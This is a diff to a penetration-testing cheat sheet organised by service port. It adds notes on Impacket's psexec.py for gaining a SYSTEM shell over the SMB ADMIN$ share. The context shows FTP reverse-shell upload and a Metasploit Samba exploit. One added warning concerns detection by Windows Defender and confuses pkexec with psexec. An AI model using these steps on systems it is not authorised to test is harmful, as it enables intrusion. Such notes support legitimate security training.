@@ -28,7 +28,6 @@ Upload a reverse shell
 ```ftp
 put shell.php
 ```
-
 # SSH (22)
 ## General 
 ```bash
@@ -70,6 +69,8 @@ $ smbclient -L \\<IP>
 - **ADMIN$**: Administrative shares are hidden network shares created by the Windows NT family of 
 operating systems that allow system administrators to have remote access to every disk volume on a 
 network-connected system. These shares may not be permanently deleted but may be disabled.
+>[!NOTE]
+> If you have access to this share, then you can use psexec.py to get a shell running at nt authority/system
 - **C$** - Administrative share for the C:\ disk volume. This is where the operating system is hosted.
 - **IPC$** - The inter-process communication share. Used for inter-process communication via named 
 pipes and is not part of the file system.
@@ -93,6 +94,20 @@ use exploit/multi/samba/usermap_script
 set RHOSTS
 set LHOST
 ```
+### psexec.py
+This script is part of Impacket, a collection of Python classes designed for working with network protocols, primarily in security and penetration testing contexts. The specific script demonstrates PSEXEC-like functionality, enabling remote command execution on a Windows machine over SMB (Server Message Block) using a service called RemComSvc.
+#### Requirements 
+- Port 445 (SMB) is OPEN
+- Administrator-level credentials (access to ADMIN$)
+- Target is Windows
+- Permissions to install services on the target
+```bash
+python <PATH TO psexec.py> username[:password]@IP
+```
+>[!WARNING]
+> pkexec is preferred in simulated testing environments, but it can be easily detected by the Windows Defender in real-world assessments
+
+
 # Rsync (873)
 Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally, 
 to/from another host over any remote shell, or to/from a remote rsync daemon. It offers 
